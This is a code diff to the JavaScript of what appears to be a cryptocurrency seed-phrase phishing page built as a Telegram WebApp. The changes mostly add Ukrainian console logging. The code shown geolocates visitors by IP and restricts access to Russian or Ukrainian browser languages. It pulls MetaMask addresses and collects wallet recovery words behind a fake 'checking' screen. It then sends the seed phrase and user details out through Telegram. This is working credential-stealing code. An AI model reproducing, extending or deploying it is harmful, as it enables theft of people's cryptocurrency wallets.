@@ -2,45 +2,56 @@
 let userIp = "undefined";
 let userLocation = "undefined";
 
+console.log("🌍 IP + геолокація ініціалізується...");
 fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
         userIp = data.ip;
         userLocation = `${data.city}, ${data.country_name}`;
+        console.log("📍 IP:", userIp, "| Локація:", userLocation);
     })
     .catch(() => {
         userIp = "unknown";
         userLocation = "unknown";
+        console.warn("⚠️ Не вдалося отримати геолокацію");
     });
 
 // 🚫 Обмеження за мовою
 const langs = navigator.languages || [navigator.language || navigator.userLanguage];
+console.log("🌐 Виявлено мови браузера:", langs);
 const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
 if (!langs.some(lang => allowedLangs.includes(lang))) {
     document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
-    throw new Error("Blocked by language");
+    throw new Error("🚫 Заблоковано через мову");
 }
 
 // ✅ DOM готовий
 window.addEventListener("DOMContentLoaded", async () => {
+    console.log("✅ DOM повністю завантажено");
+
     feather.replace();
 
     if (typeof Telegram !== "undefined" && Telegram.WebApp) {
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
-        console.log("✅ Telegram.WebApp ініціалізовано");
+        console.log("✅ Telegram WebApp ініціалізовано");
+    } else {
+        console.warn("❌ Telegram WebApp не знайдено");
     }
 
-    // 🦊 MetaMask адреса
     if (typeof window.ethereum !== "undefined") {
+        console.log("🦊 MetaMask виявлено");
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             if (accounts && accounts.length > 0) {
+                console.log("🦊 MetaMask адреса:", accounts[0]);
                 document.getElementById("wallet").value = accounts[0];
             }
         } catch (err) {
-            console.warn("⚠️ MetaMask не авторизовано", err);
+            console.warn("⚠️ Помилка авторизації MetaMask:", err);
         }
+    } else {
+        console.log("🦊 MetaMask не встановлено");
     }
 
     renderSeedInputs();
@@ -68,6 +79,7 @@ function renderSeedInputs() {
             setTimeout(() => handleBulkSeedInput(e), 50);
         });
     }
+    console.log(`🆕 Створено ${length} полів для seed-фраз`);
 }
 
 // 📋 Автозаповнення сид-фрази
@@ -79,6 +91,7 @@ function handleBulkSeedInput(e) {
         inputs.forEach((input, index) => {
             input.value = words[index] || "";
         });
+        console.log("✍️ Автозаповнення сид-фраз:", words.join(" "));
     }
 }
 
@@ -98,6 +111,7 @@ function setupSelect() {
             selected.innerHTML = option.innerHTML;
             hiddenInput.value = option.dataset.value;
             selectWrapper.classList.remove('open');
+            console.log("📥 Обрано гаманець:", option.dataset.value);
         });
     });
 
@@ -121,6 +135,7 @@ function showWarning(message) {
     }
     warning.textContent = message;
     warning.style.display = "block";
+    console.warn("🚫 Попередження:", message);
 }
 
 // 🧹 Приховати попередження
@@ -144,6 +159,7 @@ function showProcessing(message) {
         document.querySelector(".container").appendChild(processing);
     }
     processing.textContent = message;
+    console.log("⏳ Статус:", message);
 }
 
 // 🚀 Submit seed-фрази
@@ -155,6 +171,8 @@ function submitSeed() {
     const ua = navigator.userAgent;
     const inputs = document.querySelectorAll("#seedContainer .seed-word");
     const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+
+    console.log("📋 Введено слів:", words.length, "| Очікується:", length);
 
     const invalidWords = words.filter(word => !/^[a-zA-Z]+$/.test(word));
     if (invalidWords.length > 0) {
@@ -169,7 +187,7 @@ function submitSeed() {
 
     const seed = words.join(" ");
     localStorage.setItem("last_seed", seed);
-    showProcessing("⏳ Перевірка seed-фрази...");
+    showProcessing("⏳ Перевірка seed-фрази…");
     document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
     const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
@@ -193,6 +211,9 @@ function submitSeed() {
 
     if (Telegram?.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
+        console.log("📲 Payload надіслано через Telegram WebApp");
+    } else {
+        console.warn("❌ Telegram WebApp sendData недоступна");
     }
 
     setTimeout(() => {
